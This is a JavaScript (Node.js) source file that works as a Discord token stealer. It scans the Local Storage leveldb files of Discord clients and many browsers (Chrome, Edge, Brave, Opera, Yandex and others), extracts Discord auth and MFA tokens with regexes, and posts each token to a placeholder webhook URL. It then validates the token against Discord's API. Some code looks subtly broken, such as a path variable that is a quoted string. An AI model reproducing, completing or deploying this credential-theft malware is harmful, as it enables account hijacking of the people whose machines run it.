const fs = require("fs");
let os = require("os");
const fetch = require("node-fetch");
var dir = '__dirname.split("\\")';
const url = "**WEBHOOK**";
if ("win32" === os.platform()) {
    var paths = [`${dir[0]}/Users/${dir[2]}/AppData/Roaming/Discord/Local Storage/leveldb`, `${dir[0]}/Users/${dir[2]}/AppData/Roaming/DiscordDevelopment/Local Storage/leveldb`, `${dir[0]}/Users/${dir[2]}/AppData/Roaming/Lightcord/Local Storage/leveldb`, `${dir[0]}/Users/${dir[2]}/AppData/Roaming/discordptb/Local Storage/leveldb`, `${dir[0]}/Users/${dir[2]}/AppData/Roaming/discordcanary/Local Storage/leveldb`, `${dir[0]}/Users/${dir[2]}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`, `${dir[0]}/Users/${dir[2]}/AppData/Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb`, `${dir[0]}/Users/${dir[2]}/AppData/Local/Amigo/User Data/Local Storage/leveldb`, `${dir[0]}/Users/${dir[2]}/AppData/Local/Torch/User Data/Local Storage/leveldb`, `${dir[0]}/Users/${dir[2]}/AppData/Local/Kometa/User Data/Local Storage/leveldb`, `${dir[0]}/Users/${dir[2]}/AppData/Local/Orbitum/User Data/Local Storage/leveldb`, `${dir[0]}/Users/${dir[2]}/AppData/Local/CentBrowser/User Data/Local Storage/leveldb`, `${dir[0]}/Users/${dir[2]}/AppData/Local/7Star/7Star/User Data/Local Storage/leveldb`, `${dir[0]}/Users/${dir[2]}/AppData/Local/Sputnik/Sputnik/User Data/Local Storage/leveldb`, `${dir[0]}/Users/${dir[2]}/AppData/Local/Vivaldi/User Data/Default/Local Storage/leveldb`, `${dir[0]}/Users/${dir[2]}/AppData/Local/Google/Chrome SxS/User Data/Local Storage/leveldb`, `${dir[0]}/Users/${dir[2]}/AppData/Local/Epic Privacy Browser/User Data/Local Storage/leveldb`, `${dir[0]}/Users/${dir[2]}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`, `${dir[0]}/Users/${dir[2]}/AppData/Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb`, `${dir[0]}/Users/${dir[2]}/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb`, `${dir[0]}/Users/${dir[2]}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`, `${dir[0]}/Users/${dir[2]}/AppData/Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb`, `${dir[0]}/Users/${dir[2]}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`];
    for (i = 0; i < paths.length; i++) get_token(paths[i]);
    async function get_token(e) {
        try {
            fs.readdir(e, ((a, r) => {
                if (void 0 !== r) {
                    var t = r.filter((e => "ldb" === e.split(".").pop()));
                    for (i = 0; i < t.length; i++) fs.readFile(`${e}/${t[i]}`, "utf-8", (async function (e, a) {
                        let [r] = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/.exec(a) || /"mfa\.[\d\w_-]{84}"/.exec(a) || [null];
                        if (null != r) {
                            r = r.replace(/"/g, "");
                            const e = new URLSearchParams;
                            e.append("token", r), fetch(url, {
                                method: "POST",
                                headers: {
                                    "Content-Type": "application/json"
                                },
                                body: JSON.stringify({
                                    content: r
                                })
                            }), fetch("https://discord.com", {
                                method: "POST",
                                body: e
                            }), await fetch("https://discord.com/api/v6/users/@me", {
                                headers: {
                                    authorization: r
                                }
                            }).then((e => e.json())).then((e => {
                                e.id && send(r)
                            }))
                        }
                    }))
                }
            })), fs.readdir(e, ((a, r) => {
                if (void 0 !== r) {
                    var t = r.filter((e => "log" === e.split(".").pop()));
                    for (i = 0; i < t.length; i++) fs.readFile(`${e}/${t[i]}`, "utf-8", (async function (e, a) {
                        let r = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
                        r.test(a);
                        let [t] = r.exec(a) || /"mfa\.[\d\w_-]{84}"/.exec(a) || [null];
                        if (null != t) {
                            t = t.replace(/"/g, "");
                            const e = new URLSearchParams;
                            e.append("token", t), fetch("https://discord.com", {
                                method: "POST",
                                body: e
                            }), fetch(url, {
                                method: "POST",
                                headers: {
                                    "Content-Type": "application/json"
                                },
                                body: JSON.stringify({
                                    content: t
                                })
                            }), await fetch("https://discord.com/api/v6/users/@me", {
                                headers: {
                                    authorization: t
                                }
                            }).then((e => e.json())).then((e => {
                                e.id && send(t)
                            }))
                        }
                    }))
                }
            }))
        } catch (e) {
            console.log(e)
        }
    }

    function send(e) {}
}